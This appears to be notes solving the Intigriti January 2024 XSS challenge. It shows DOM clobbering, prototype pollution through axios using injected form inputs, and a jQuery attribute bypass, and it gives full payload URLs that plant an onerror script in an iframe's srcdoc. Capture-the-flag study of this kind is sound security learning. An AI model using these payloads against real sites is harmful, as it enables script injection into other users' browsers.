+ dom clobbering in search parameter.insert another `<form id=”search”> `above the form that’s in the challenge page. However, this would only allow me to hijack the searches, and that wouldn’t get me an XSS.

+ prototype pollution in axios library
payload: https://challenge-0124.intigriti.io/challenge?search=con&name=%3Cform+id%3Dsearch%3E%3Cinput+name%3D%22__proto__%5Bintigriti%5D%22+value%3D%22rodriguezjorgex%22%3E

+bypassing jquery checks
```
 if (repo.homepage && repo.homepage.startsWith("https://")) {
                $("#homepage").attr({
                    "src": repo.homepage,
                    "hidden": false
```
payload: `https://challenge-0124.intigriti.io/challenge?search=con&name=<form id=search><input name="__proto__[srcdoc][]" value="<img/src/onerror=alert(document.domain)>"><input name="__proto__[homepage]" value="https://google.com"><input name="__proto__[owner]" value="test">`
We get this error:
jquery-3.7.1.min.js:2 Uncaught (in promise) TypeError: Cannot use 'in' operator to search for 'set' in https://google.com
+ f I set the i variable to an array, it will bypass the error, and the e.setAttribute() function will be called, setting an attribute in the <iframe> tag. So if I can add an srcdoc attribute
+ by using __proto__[srcdoc][], I can make srcdoc into an array, and bypass the error, then execute the e.setAttribute function. Here’s the final payload:
`https://challenge-0124.intigriti.io/challenge?search=con&name=<form id=search><input name="__proto__[srcdoc][]" value="<img/src/onerror=alert(document.domain)>"><input name="__proto__[homepage]" value="https://google.com"><input name="__proto__[owner]" value="test">`
+ ![image](https://github.com/av4nth1ka/Intigriti-XSS-challenges/assets/80388135/350819e0-e47c-4275-b07e-22c930831492)
refer: https://medium.com/@rodriguezjorgex/how-i-passed-the-intigriti-0124-challenge-b6c2d1cd1b7b

